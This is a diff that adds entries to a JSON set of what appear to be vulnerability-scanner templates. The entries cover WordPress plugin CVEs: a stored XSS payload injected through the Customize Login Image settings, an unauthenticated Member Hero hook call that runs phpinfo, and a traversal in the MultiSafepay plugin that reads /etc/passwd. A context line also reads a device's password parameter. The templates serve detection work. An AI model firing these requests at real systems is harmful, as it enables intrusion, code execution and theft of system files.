@@ -17008,6 +17008,23 @@
       ]
     },
     {
+      "id": "CVE-2021-33851",
+      "info": {
+        "name": "Customize Login Image < 3.5.3 - Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In\n",
+            "GET /wp-admin/options-general.php?page=customize-login-image/customize-login-image-options.php HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /wp-admin/options.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\noption_page=customize-login-image-settings-group&action=update&_wpnonce={{nonce}}&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Foptions-general.php%3Fpage%3Dcustomize-login-image%252Fcustomize-login-image-options.php%26settings-updated%3Dtrue&cli_logo_url=<script>alert(document.domain)</script>&cli_logo_file=&cli_login_background_color=&cli_custom_css=\n",
+            "GET /wp-login.php HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-33904",
       "info": {
         "name": "Accela Civic Platform <=21.1 - Cross-Site Scripting",
@@ -19649,6 +19666,21 @@
       ]
     },
     {
+      "id": "CVE-2022-0885",
+      "info": {
+        "name": "Member Hero <= 1.0.9 - Unauthenticated Remote Code Execution",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-admin/admin-ajax.php?action=memberhero_send_form&_memberhero_hook=phpinfo"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-0928",
       "info": {
         "name": "Microweber <1.2.12 - Stored Cross-Site Scripting",
@@ -21891,6 +21923,21 @@
         {
           "raw": [
             "GET /cgi/get_param.cgi?xml&sys.passwd&sys.su.name HTTP/1.1\nHost: {{Hostname}}\nCookie: tmpToken=;\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-33901",
+      "info": {
+        "name": "MultiSafepay plugin for WooCommerce <= 4.13.1 - Unauthenticated Arbitrary File Read",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-admin/admin-ajax.php?action=admin_init&log_filename=../../../../../../../../../../../../../etc/passwd"
           ]
         }
       ]
